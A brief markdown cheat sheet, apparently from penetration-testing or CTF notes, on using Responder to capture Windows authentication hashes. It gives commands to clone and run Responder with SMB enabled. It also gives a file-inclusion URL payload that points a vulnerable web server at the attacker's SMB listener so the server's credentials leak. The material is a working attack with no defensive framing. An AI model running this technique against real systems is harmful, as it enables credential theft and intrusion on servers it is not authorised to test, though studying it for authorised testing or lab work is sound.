# Install Responder

```
git clone https://github.com/lgandx/Responder
```

- Also, verify that Responder can listen for SMB requests

```
cat responder.conf

; Servers to start
SQL      = On
SMB      = On
```

# Specify network interface

```
sudo python3 Responder.py -I tun0 (example)
```

- After running this, you can use host which is written in message below and use it in browser, Responder will work as listener
- Remember, the website should be vulnerable to RFI and LFI

```
http://example.com?page=//<responder_ip>/<some_random_file_name>
```
